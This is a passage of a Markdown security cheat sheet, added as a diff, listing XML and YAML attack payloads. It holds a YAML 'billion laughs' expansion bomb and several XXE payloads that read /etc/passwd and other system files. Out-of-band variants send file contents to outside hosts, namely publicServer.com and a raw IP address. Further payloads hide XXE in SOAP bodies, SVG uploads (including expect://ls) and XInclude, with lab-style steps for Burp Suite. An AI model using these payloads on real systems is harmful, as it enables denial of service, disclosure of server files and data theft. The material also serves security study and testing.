+# Yaml attack
+
+a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
+b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
+c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
+d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
+e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
+f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
+g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
+h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
+i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
+
+# XXE OOB Attack (Yunusov, 2013)
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data SYSTEM "http://publicServer.com/parameterEntity_oob.dtd">
+<data>&send;</data>
+
+File stored on http://publicServer.com/parameterEntity_oob.dtd
+<!ENTITY % file SYSTEM "file:///sys/power/image_size">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>">
+%all;
+
+# XXE OOB with DTD and PHP filter
+
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY % sp SYSTEM "http://92.222.81.2/dtd.xml">
+%sp;
+%param1;
+]>
+<r>&exfil;</r>
+
+File stored on http://92.222.81.2/dtd.xml
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://92.222.81.2/dtd.xml?%data;'>">
+
+# XXE Inside SOAP
+
+<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
+
+# XXE PoC
+
+<!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "file:///etc/passwd"> ]><x>&xxe_test;</x>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "file:///etc/passwd"> ]><x>&xxe_test;</x>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe_test [<!ELEMENT foo ANY><!ENTITY xxe_test SYSTEM "file:///etc/passwd">]><foo>&xxe_test;</foo>
+
+# XXE file upload SVG
+<svg>&xxe;</svg>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
+    <image xlink:href="expect://ls"></image>
+</svg>
+
+<?xml version="1.0" encdoing="UTF-8" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="512px" height="512px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="14" x="0" y="16">&xxe;</text></svg>  
+
+# XXE Hidden Attack
+
+- Xinclude
+
+Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
+Set the value of the productId parameter to:
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+- File uploads:
+
+Create a local SVG image with the following content:
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+Post a comment on a blog post, and upload this image as an avatar.
+When you view your comment, you should see the contents of the /etc/hostname file in your image. Then use the "Submit solution" but
+```
+
+## Mindmap
+
+![](<../../.gitbook/assets/image (26).png>)
+
+{% embed url="https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-advanced-xxe-vulnerabilities" %}
+END_FILE
